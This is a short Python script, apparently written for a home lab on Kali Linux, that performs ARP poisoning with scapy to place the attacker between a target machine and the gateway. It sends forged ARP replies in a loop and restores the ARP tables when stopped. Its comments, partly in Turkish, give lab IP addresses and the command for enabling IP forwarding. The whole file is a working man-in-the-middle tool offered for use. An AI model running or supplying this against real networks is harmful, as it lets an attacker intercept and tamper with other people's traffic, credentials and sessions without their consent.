import scapy.all as scapy
import time
import optparse

# echo 1> /proc/sys/net/ipv4/ip_forward      -> you need to do everytime when your comp. start on cmd
# Saldırgan, makinesinin ethernet kartını ağdan gelen tüm paketleri yönlendir moduna sokar.
# echo 1 > /proc/sys/net/ipv4/ip_forward  
# -------------------------------------------------------
# python3 My_Mitm.py -t 10.0.2.15 -g 10.0.2.1

# -------------------------------------------------------
# target ip : 10.0.2.15   second machine
# my ip : 10.0.2.4        current machine
# modem ip : 10.0.2.1     modem
# -------------------------------------------------------

# -------------------------------------------------------
# first you need to write 'echo 1 > /proc/sys/net/ipv4/ip_forward'
# then you can use this app on kali linux
# my arp posion
# op = 1 request   ||   op = 2 response
# -------------------------------------------------------

def get_user_input():
    parse_object = optparse.OptionParser()
    parse_object.add_option("-t", "--target", dest="target_ip", help="Enter Target ip")
    parse_object.add_option("-g", "--gateway", dest="gateway_ip", help="Enter Gateway ip")
    # (options, arguments) = parse_object.parse_args()
    # we wanna get just options
    # [0] = options    ||    [1] = arguments
    options = parse_object.parse_args()[0]
    if not options.target_ip:
        print("Enter Target IP")
    if not options.gateway_ip:
        print("Enter Gateway IP")
    print(options.target_ip," / / / ", options.gateway_ip)
    return options

def get_mac_adress(ip):
    arp_request = scapy.ARP(pdst = ip)
    #scapy.ls(scapy.ARP())       # get info
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    #scapy.ls(scapy.Ether())     # get info

    combined_packet = broadcast/arp_request
    answered_list= scapy.srp(combined_packet,verbose=False ,timeout = 1)[0]
    return answered_list[0][1].hwsrc

def arp_poisoning(target_ip, poisoned_ip):
    target_mac = get_mac_adress(target_ip)
    # print("target_ip : ",target_ip,"  poisoned_ip : ",poisoned_ip,"   mac : ",target_mac)
    # arp_response = scapy.ARP(op = 2,pdst = "10.0.2.15",hwdst = "08:00:27:e6:e5:59", psrc = "10.0.2.1")

    arp_response = scapy.ARP(op = 2,pdst = target_ip,hwdst = target_mac, psrc = poisoned_ip)
    scapy.send(arp_response, verbose=False)     # sending report is false - 'verbose'

    # arp_response = scapy.ARP()    # get your Operating System details
    # scapy.ls(scapy.ARP())         # get info

def reset_operation(fooled_ip, gateway_ip):
    fooled_mac = get_mac_adress(fooled_ip)
    gateway_mac = get_mac_adress(gateway_ip)
    arp_response = scapy.ARP(op = 2, pdst = fooled_ip,hwdst = fooled_mac, psrc = gateway_ip, hwsrc= gateway_mac)
    scapy.send(arp_response, verbose=False, count=6)     # sending report is false - 'verbose'
                                                         # count=6  send package for 6 times

user_ips = get_user_input()
target_ip = user_ips.target_ip
gateway_ip = user_ips.gateway_ip
num = 0;

try :
    while True :
        arp_poisoning(target_ip,gateway_ip)    # for target
        arp_poisoning(gateway_ip,target_ip)    # for modem
        num += 2
        print("\rsending packets ",end = " "+str(num))
        time.sleep(3)
except KeyboardInterrupt:
    print("\n Quit and Reset")
    reset_operation(target_ip,gateway_ip)
    reset_operation(gateway_ip,target_ip)
